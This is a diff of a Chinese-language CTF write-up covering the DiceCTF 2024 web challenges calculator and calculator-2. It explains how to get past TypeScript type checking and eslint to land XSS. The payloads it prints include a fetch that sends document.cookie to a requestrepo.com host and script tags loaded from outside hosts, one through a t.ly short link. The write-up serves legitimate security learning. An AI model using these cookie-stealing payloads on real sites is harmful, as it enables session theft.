+<div class="highlight"><pre><span></span><code><span class="cm">/*eslint-disable*/</span><span class="w"> </span><span class="s1">'&lt;script&gt;alert(0)&lt;/script&gt;'</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="nx">any</span>
+</code></pre></div>
+<p><a href="https://requestrepo.com/"><span>requestrepo<span class="heti-spacing"> </span></span></a>还蛮好用的，能够记录<span class="heti-skip"><span class="heti-spacing"> </span>HTTP<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>DNS<span class="heti-spacing"> </span></span>的请求，还支持设置返回内容、<span>DNS<span class="heti-spacing"> </span></span>记录等等。</p>
+<p>将 <code>Response</code> 设置为：</p>
+<div class="highlight"><pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s1">'https://opkpqgz5.requestrepo.com/?a='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
+</code></pre></div>
+<p>XSS Payload:</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/*eslint-disable*/</span><span class="s1">'&lt;script src=//opkpqgz5.requestrepo.com&gt;&lt;/script&gt;'</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="nx">any</span>
+</code></pre></div>
+<p>勉强在长度限制内。</p>
+<p>Flag: <code>dice{society_if_typescript_were_sound}</code></p>
+<h2 id="webcalculator-2">web/calculator-2<a class="headerlink" href="#webcalculator-2" title="Permanent link">¶</a></h2>
+<p>参考<span><span class="heti-spacing"> </span>write-up</span>：<a href="https://ouuan.moe/post/2024/02/dicectf-2024-quals#calculator">ouuan.moe/post/2024/02/dicectf-2024-quals#calculator</a></p>
+<p>给出了几个<span><span class="heti-spacing"> </span>Payload</span>：</p>
+<div class="highlight"><pre><span></span><code><span class="p">((</span><span class="nx">x</span><span class="o">:</span><span class="p">[</span><span class="kt">number</span><span class="o">|</span><span class="kt">string</span><span class="p">])=&gt;</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">==</span><span class="s1">'number'</span><span class="o">?</span><span class="p">((</span><span class="nx">y</span><span class="p">=&gt;{</span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="p">})(</span><span class="nx">x</span><span class="p">),</span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span><span class="o">:</span><span class="mf">1</span><span class="p">)([</span><span class="mf">0</span><span class="p">])</span>
+
+<span class="c1">// 我不知道怎样格式化能让它好看一些</span>
+<span class="p">(</span>
+<span class="w">    </span><span class="p">(</span><span class="nx">x</span><span class="o">:</span><span class="p">[</span><span class="kt">number</span><span class="o">|</span><span class="kt">string</span><span class="p">])</span><span class="w"> </span><span class="p">=&gt;</span>
+<span class="w">        </span><span class="ow">typeof</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">'number'</span><span class="w"> </span><span class="o">?</span>
+<span class="w">            </span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})(</span><span class="nx">x</span><span class="p">),</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="p">)</span>
+<span class="w">        </span><span class="o">:</span>
+<span class="w">            </span><span class="mf">1</span>
+<span class="p">)([</span><span class="mf">0</span><span class="p">])</span>
+</code></pre></div>
+<p>创建了一个函数，接收一个元素类型为 <code>number</code> 或 <code>string</code> 的数组作为参数，在函数内部判断首个元素是否是 <code>number</code> 类型，如果是的话就调用另一个函数。</p>
+<p><code class="highlight"><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})</span></code> 函数将参数 <code>y</code> 的首元素换成了 <code>'*'</code>，所以 <code class="highlight"><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="nx">y</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">y</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">=</span><span class="s1">'*'</span><span class="w"> </span><span class="p">})(</span><span class="nx">x</span><span class="p">),</span><span class="w"> </span><span class="nx">x</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="p">)</span></code> 相当于返回了 <code class="highlight"><span class="s1">'*'</span></code> 字符串。</p>
+<p>所以整体就是返回 <code class="highlight"><span class="s1">'*'</span></code> 字符串，应该是可以修改这个位置的内容来<span><span class="heti-spacing"> </span>XSS</span>。</p>
+<p>这些操作应该是可以迷惑类型检查的吧，但是这个<span class="heti-skip"><span class="heti-spacing"> </span>Payload<span class="heti-spacing"> </span></span>超出长度限制了。</p>
+<p>还有另一个<span><span class="heti-spacing"> </span>Payload</span>：</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Object</span><span class="p">.</span><span class="nx">assign</span><span class="p">({},{</span><span class="nx">a</span><span class="o">:</span><span class="kt">1</span><span class="p">},{</span><span class="nx">a</span><span class="o">:</span><span class="s1">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span class="p">}).</span><span class="nx">a</span>
+</code></pre></div>
+<p>通过合并对象覆盖属性来获得字符串，但这个会因为 <code>as</code> 而被阻止。</p>
+<p><span>write-up<span class="heti-spacing"> </span></span>的最后给出了一个可用的<span><span class="heti-spacing"> </span>Payload</span>，利用了 <code class="highlight"><span class="nb">Array</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">sort</span></code>。</p>
+<p>这是题解作者找到的<span><span class="heti-spacing"> </span>Issue</span>：<a href="https://github.com/microsoft/TypeScript/issues/52375">github.com/microsoft/TypeScript/issues/52375</a></p>
+<p>当就地修改数组时（排序等<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，元组的类型保持不变，仍然是更改前的类型。</p>
+<p>于是得到<span><span class="heti-spacing"> </span>Payload</span>：</p>
+<div class="highlight"><pre><span></span><code><span class="p">((</span><span class="nx">a</span><span class="o">:</span><span class="p">[</span><span class="kt">string</span><span class="p">,</span><span class="mf">1</span><span class="p">])=&gt;</span><span class="nx">a</span><span class="p">.</span><span class="nx">sort</span><span class="p">())([</span><span class="s1">'&lt;script src=/'</span><span class="o">+</span><span class="s1">'/t.ly/RlAc0&gt;&lt;/script&gt;'</span><span class="p">,</span><span class="mf">1</span><span class="p">])[</span><span class="mf">1</span><span class="p">]</span>
+</code></pre></div>
+<p><span>URL<span class="heti-spacing"> </span></span>需要缩短一下，推荐<a href="https://t.ly/"><span><span class="heti-spacing"> </span>t.ly</span></a></p>
+<p>（如果随机的短网址中包含了黑名单词，就再缩短一次吧……如果你和我一样倒霉的话）</p>
+<p>Flag: <code>dice{learning-how-eslint-works}</code></p>
 <aside class="md-source-file">
 <span class="md-source-file__fact">
 <span class="md-icon" title="最后更新">
 <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"></path></svg>
 </span>
-<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年2月5日 06:04:18</span>
+<span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2024年2月11日 05:14:07</span>
 </span>
 <span class="md-source-file__fact">
 <span class="md-icon" title="创建日期">
